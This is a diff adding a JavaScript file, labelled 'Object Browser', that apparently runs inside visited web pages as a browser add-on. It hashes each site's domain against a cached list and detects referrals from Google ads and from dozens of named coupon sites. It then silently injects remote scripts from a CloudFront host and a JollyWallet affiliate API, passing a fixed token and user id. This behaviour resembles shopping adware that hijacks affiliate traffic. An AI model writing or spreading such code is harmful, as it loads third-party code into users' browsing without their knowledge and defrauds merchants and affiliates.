@@ -1,0 +1,198 @@
+var jw_app_name = 'Object Browser'; 
+var jw_utils = {}; 
+jw_utils.inArray = Array.prototype.indexOf ? function (arr, val) {return arr.indexOf(val) != -1;}:
+function (arr, val) {var i = arr.length;while (i--) {if (arr[i] === val) return true;}	return false;};
+var jw_md5 = {};
+jw_md5.removeStart = function (url, l){	a = url;
+	for (i = 0; i < l.length; i++) {
+p = l[i];
+if (url.indexOf(p) === 0) {a = url.slice(p.length);break;}
+}
+return a;
+};
+jw_md5.endsWith = function (str, suffix) {return str.indexOf(suffix, str.length - suffix.length) !== -1;};
+jw_md5.BuildKeys = function (url) {
+	if( url.indexOf('chrome-devtools://') === 0 )return null;
+	var protocols = ['http://', 'https://', 'ftp://'];
+	var a = jw_md5.removeStart(url,protocols);
+	var prefix = ['www.', 'www2.'];
+	a = jw_md5.removeStart(a,prefix);
+var b = a.split('?');
+var c = b[0].split('/');
+var d = c[0];
+var e = d.split('.');
+var e_len = e.length;
+var domain_terminator = ['com', 'org'];
+for(i=0;i<domain_terminator.length;i++){
+	if( e[e_len-1] == domain_terminator[i] ){
+		e.splice(e_len-1,e_len-1);
+		if(e_len>2)	e.splice(0, e_len-2);
+		break;
+	}
+}
+for (i = 0; i < e.length; i++) {
+	e[i] = e[i].replace('-','_');
+	e[i] = jw_md5.calcMD5(e[i]);
+}
+return e;
+};
+jw_md5.rhex = function (num) {var hex_chr = '0123456789abcdef';
+	str = '';
+	for (j = 0; j <= 3; j++)str += hex_chr.charAt((num >> (j * 8 + 4)) & 0x0F) + hex_chr.charAt((num >> (j * 8)) & 0x0F);
+	return str;
+};
+jw_md5.str2blks_MD5 = function (str) {
+	nblk = ((str.length + 8) >> 6) + 1;
+	blks = new Array(nblk * 16);
+	for (i = 0; i < nblk * 16; i++) blks[i] = 0;
+	for (i = 0; i < str.length; i++)
+		blks[i >> 2] |= str.charCodeAt(i) << ((i % 4) * 8);
+	blks[i >> 2] |= 0x80 << ((i % 4) * 8);
+	blks[nblk * 16 - 2] = str.length * 8;
+	return blks;
+};
+jw_md5.add = function (x, y) {var lsw = (x & 0xFFFF) + (y & 0xFFFF);var msw = (x >> 16) + (y >> 16) + (lsw >> 16);	return (msw << 16) | (lsw & 0xFFFF);};
+jw_md5.rol =function(num,cnt) { return (num << cnt) | (num >>> (32 - cnt));};
+jw_md5.cmn =function(q,a,b,x,s,t)   { return jw_md5.add(jw_md5.rol(jw_md5.add(jw_md5.add(a, q), jw_md5.add(x, t)), s), b);};
+jw_md5.ff = function(a,b,c,d,x,s,t) { return jw_md5.cmn((b & c) | ((~b) & d), a, b, x, s, t);};
+jw_md5.gg = function(a,b,c,d,x,s,t) { return jw_md5.cmn((b & d) | (c & (~d)), a, b, x, s, t);};
+jw_md5.hh = function(a,b,c,d,x,s,t) { return jw_md5.cmn(b ^ c ^ d, a, b, x, s, t);};
+jw_md5.ii = function(a,b,c,d,x,s,t) { return jw_md5.cmn(c ^ (b | (~d)), a, b, x, s, t);};
+jw_md5.calcMD5 = function(str) {
+	x = jw_md5.str2blks_MD5(str);
+	a = 1732584193; b = -271733879; c = -1732584194; d = 271733878;
+	for (i = 0; i < x.length; i += 16) {
+		olda = a; oldb = b; oldc = c; oldd = d;
+		a = jw_md5.ff(a, b, c, d, x[i + 0], 7, -680876936);		d = jw_md5.ff(d, a, b, c, x[i + 1], 12, -389564586);	c = jw_md5.ff(c, d, a, b, x[i + 2], 17, 606105819);		b = jw_md5.ff(b, c, d, a, x[i + 3], 22, -1044525330);
+		a = jw_md5.ff(a, b, c, d, x[i + 4], 7, -176418897);		d = jw_md5.ff(d, a, b, c, x[i + 5], 12, 1200080426);	c = jw_md5.ff(c, d, a, b, x[i + 6], 17, -1473231341);	b = jw_md5.ff(b, c, d, a, x[i + 7], 22, -45705983);
+		a = jw_md5.ff(a, b, c, d, x[i + 8], 7, 1770035416);		d = jw_md5.ff(d, a, b, c, x[i + 9], 12, -1958414417);	c = jw_md5.ff(c, d, a, b, x[i + 10], 17, -42063);		b = jw_md5.ff(b, c, d, a, x[i + 11], 22, -1990404162);
+		a = jw_md5.ff(a, b, c, d, x[i + 12], 7, 1804603682);	d = jw_md5.ff(d, a, b, c, x[i + 13], 12, -40341101);	c = jw_md5.ff(c, d, a, b, x[i + 14], 17, -1502002290);	b = jw_md5.ff(b, c, d, a, x[i + 15], 22, 1236535329);
+		a = jw_md5.gg(a, b, c, d, x[i + 1], 5, -165796510);		d = jw_md5.gg(d, a, b, c, x[i + 6], 9, -1069501632);	c = jw_md5.gg(c, d, a, b, x[i + 11], 14, 643717713);	b = jw_md5.gg(b, c, d, a, x[i + 0], 20, -373897302);
+		a = jw_md5.gg(a, b, c, d, x[i + 5], 5, -701558691);		d = jw_md5.gg(d, a, b, c, x[i + 10], 9, 38016083);		c = jw_md5.gg(c, d, a, b, x[i + 15], 14, -660478335);	b = jw_md5.gg(b, c, d, a, x[i + 4], 20, -405537848);
+		a = jw_md5.gg(a, b, c, d, x[i + 9], 5, 568446438);		d = jw_md5.gg(d, a, b, c, x[i + 14], 9, -1019803690);	c = jw_md5.gg(c, d, a, b, x[i + 3], 14, -187363961);	b = jw_md5.gg(b, c, d, a, x[i + 8], 20, 1163531501);
+		a = jw_md5.gg(a, b, c, d, x[i + 13], 5, -1444681467);	d = jw_md5.gg(d, a, b, c, x[i + 2], 9, -51403784);		c = jw_md5.gg(c, d, a, b, x[i + 7], 14, 1735328473);	b = jw_md5.gg(b, c, d, a, x[i + 12], 20, -1926607734);
+		a = jw_md5.hh(a, b, c, d, x[i + 5], 4, -378558);		d = jw_md5.hh(d, a, b, c, x[i + 8], 11, -2022574463);	c = jw_md5.hh(c, d, a, b, x[i + 11], 16, 1839030562);	b = jw_md5.hh(b, c, d, a, x[i + 14], 23, -35309556);
+		a = jw_md5.hh(a, b, c, d, x[i + 1], 4, -1530992060);	d = jw_md5.hh(d, a, b, c, x[i + 4], 11, 1272893353);	c = jw_md5.hh(c, d, a, b, x[i + 7], 16, -155497632);	b = jw_md5.hh(b, c, d, a, x[i + 10], 23, -1094730640);
+		a = jw_md5.hh(a, b, c, d, x[i + 13], 4, 681279174);		d = jw_md5.hh(d, a, b, c, x[i + 0], 11, -358537222);	c = jw_md5.hh(c, d, a, b, x[i + 3], 16, -722521979);	b = jw_md5.hh(b, c, d, a, x[i + 6], 23, 76029189);
+		a = jw_md5.hh(a, b, c, d, x[i + 9], 4, -640364487);		d = jw_md5.hh(d, a, b, c, x[i + 12], 11, -421815835);	c = jw_md5.hh(c, d, a, b, x[i + 15], 16, 530742520);	b = jw_md5.hh(b, c, d, a, x[i + 2], 23, -995338651);
+		a = jw_md5.ii(a, b, c, d, x[i + 0], 6, -198630844);		d = jw_md5.ii(d, a, b, c, x[i + 7], 10, 1126891415);	c = jw_md5.ii(c, d, a, b, x[i + 14], 15, -1416354905);	b = jw_md5.ii(b, c, d, a, x[i + 5], 21, -57434055);
+		a = jw_md5.ii(a, b, c, d, x[i + 12], 6, 1700485571);	d = jw_md5.ii(d, a, b, c, x[i + 3], 10, -1894986606);	c = jw_md5.ii(c, d, a, b, x[i + 10], 15, -1051523);		b = jw_md5.ii(b, c, d, a, x[i + 1], 21, -2054922799);
+		a = jw_md5.ii(a, b, c, d, x[i + 8], 6, 1873313359);		d = jw_md5.ii(d, a, b, c, x[i + 15], 10, -30611744);	c = jw_md5.ii(c, d, a, b, x[i + 6], 15, -1560198380);	b = jw_md5.ii(b, c, d, a, x[i + 13], 21, 1309151649);
+		a = jw_md5.ii(a, b, c, d, x[i + 4], 6, -145523070);		d = jw_md5.ii(d, a, b, c, x[i + 11], 10, -1120210379);	c = jw_md5.ii(c, d, a, b, x[i + 2], 15, 718787259);		b = jw_md5.ii(b, c, d, a, x[i + 9], 21, -343485551);
+		a = jw_md5.add(a, olda);b = jw_md5.add(b, oldb);c = jw_md5.add(c, oldc);d = jw_md5.add(d, oldd);
+	}
+	return jw_md5.rhex(a) + jw_md5.rhex(b) + jw_md5.rhex(c) + jw_md5.rhex(d);
+};
+var tbView = {};
+tbView.isInBlackList = function(url) {
+	var res= false;
+	var d1='';
+	if(jw_db_bl && jw_db_bl.permanentCache)
+		{
+		for(var i=0;i<jw_db_bl.permanentCache.length;i++)
+		{
+			d1=jw_db_bl.permanentCache[i];
+			if(url.indexOf(d1) >= 0){
+				return true;
+			}
+		}
+	}
+	return res;
+};
+tbView.isInLocalCache = function (url) {if( tbView.isInBlackList(url))	return false;var res = false;
+	var keys = jw_md5.BuildKeys(url);
+	if(keys!==null){
+		var key='';
+		for (var i = 0; i < keys.length; i++) {
+			key = keys[i];
+			res = jw_utils.inArray(tbView.localCachDb, key);
+			if(res) {
+				break;
+			}
+		}
+	}
+	return res;
+};
+tbView.loadjscssfile = function (id,filename,filetype,success)
+{
+	if( document.getElementById(id)) {if(success) success(); return;}
+	if (filetype=='js'){
+		var fileref=document.createElement('script');
+		fileref.setAttribute('type','text/javascript');
+		fileref.setAttribute('id',id);
+		fileref.setAttribute('src',filename);
+		var done=false;
+	if(success)fileref.onload = fileref.onreadystatechange = function(){
+if (!done && (!this.readyState || this.readyState == 'loaded' || this.readyState == 'complete')) {done = true;success();fileref.onload = fileref.onreadystatechange = null;
+		}};
+	}else if (filetype=='css'){
+		var fileref=document.createElement('link');
+		fileref.setAttribute('rel','stylesheet');
+		fileref.setAttribute('type','text/css');
+		fileref.setAttribute('id',id);
+		fileref.setAttribute('href',filename);}
+	if (typeof fileref!='undefined')document.getElementsByTagName('head')[0].appendChild(fileref);
+};
+tbView.getCookie = function(c_name) {
+	var c_value = document.cookie;
+	var c_start = c_value.indexOf(' ' + c_name + '=');
+	if (c_start == -1) {c_start = c_value.indexOf(c_name + '=');}
+	if (c_start == -1) {c_value = null;	} else {
+		c_start = c_value.indexOf('=', c_start) + 1;
+		var c_end = c_value.indexOf(';', c_start);
+		if (c_end == -1) {c_end = c_value.length;}
+		c_value = unescape(c_value.substring(c_start, c_end));
+	}
+	return c_value;
+};
+tbView.addInitFrame=function(dist,sub,ver) { if( tbView.isInBlackList(document.URL) ) return false; return true;};
+tbView.isAffiliateRef=function(){
+	var ref=document.referrer;
+	if((ref.indexOf('.google.')>0) && (ref.indexOf('&ai=')>0)) return '1';
+	var aff_list = ['flamingoworld.com','anycodes.com','bradsdeals.com','cdcoupons.com','cheaperseeker.com','chippmunk.com',
+'couponalert.com','couponcabin.com','couponchief.com','coupondudes.com','couponfollow.com','couponmountain.com',
+'couponpaste.com','coupons.com','dealcatcher.com','dealigg.com','deallocker.com','dealspl.us','dealsvario.com',
+'dropdowndeals.com','goodsearch.com','multimediamuse.org','mycoupons.com','offers.com',
+'piggycoupons.com','promocodesforyou.com','retailmenot.com','riocoupon.com','savings-center.com','slickdeals.net',
+'thecouponscoop.com','tjoos.com','wantacode.com','yourcoupongirl.com','befrugal.com','couponscave.com','toastybear.com',
+'scitechdaily.com','8couponcode.com','couponmom.com','couponwinner.com','dealally.com','deals2buy.com','deals365.us',
+'finddiscountcodes.com','megastoredeals.com','promotioncode.org','shopfest.com','sumocoupon.com','techbargains.com','extrabux.com','ebates.com'];
+	for (var i in aff_list) {aff=aff_list[i];if(ref.indexOf(aff)>1) return '2';}
+	return '0';
+};
+tbView.jw_loaded = false;
+var jw_jquery = null;
+tbView.prepare = function(protocol){
+if(tbView.jw_loaded) return;
+	var host=protocol + 'd2cnb4m0nke2lh.cloudfront.net';
+	var jw_old_jq_detected = false;
+	if(typeof jQuery == 'undefined'){if(typeof $ == 'function'){jw_old_jq_detected = true;}}
+	tbView.loadjscssfile('jw_0',host+'/resources/js/jquery-1.7.1.min.js','js',
+		function(){if (typeof jQuery=='undefined'){}
+			else{tbView.loadjscssfile('jw_6',host +'/tlb/v3/jw_fb206/source/jquery.jw_fancybox.js','js',function(){
+				tbView.jw_loaded=true;
+				jw_jquery=jQuery.noConflict(true);
+			});}});
+	tbView.loadjscssfile('jw_1_2',host+'/tlb/platform/js/jw_interface_2.js','js');
+	tbView.loadjscssfile('jw_3',host+'/tlb/v3/jw_bar.css','css');
+	tbView.loadjscssfile('jw_4',host+'/tlb/v3/jw_bar.js','js');
+	tbView.loadjscssfile('jw_5',host+'/tlb/v3/jw_fb206/source/jquery.jw_fancybox.css','css');
+};
+tbView.open_myaccount = function(){
+ if (typeof jw_jquery != 'undefined' && jw_jquery != null) {
+	if(document.getElementById('jw_5') && document.getElementById('jw_4') && document.getElementById('jw_3') && document.getElementById('jw_1_2') && document.getElementById('jw_0')) {
+		if(typeof jwBarInterface != 'undefined'){ jwBarInterface.token='f99d2c8c-2460-5d28-c436-c8974dfbf502';jwBarInterface.aff_id='000046'; jwBarInterface.jw_open_popup('myaccount'); return;} 
+	}}
+	setTimeout(function(){tbView.open_myaccount();},20);
+};
+tbView.myaccount = function(ref){
+	var protocol = 'http://';
+	if( document && document.location) if('https:' == document.location.protocol) protocol='https://'; 
+	tbView.prepare(protocol);
+	setTimeout(function(){tbView.open_myaccount()},20);
+};
+tbView.start = function(){
+if(typeof jw_db == 'undefined') { setTimeout(tbView.start(),300); return; }
+tbView.localCachDb = jw_db.permanentCache;
+if(tbView.addInitFrame('0','0','1') && tbView.isInLocalCache(document.URL)) {var aff_ref=tbView.isAffiliateRef(); tbView.loadjscssfile('jw_a',window.location.protocol+'//api.jollywallet.com/affiliate/jsquery2?dist=0&sub=0&ver=1&token=f99d2c8c-2460-5d28-c436-c8974dfbf502&app_id=000046&s1=0&s2=0&s3=0&uid=DE35472CBA5E40D9B6CA0D890092E5BFIE&aff_ref='+aff_ref+'&r='+Math.random(),'js',null);}};
+tbView.loadjscssfile('jw_00',window.location.protocol+'//d2cnb4m0nke2lh.cloudfront.net/jollywallet/resources/js/2/affiliate_client.js','js',tbView.start);
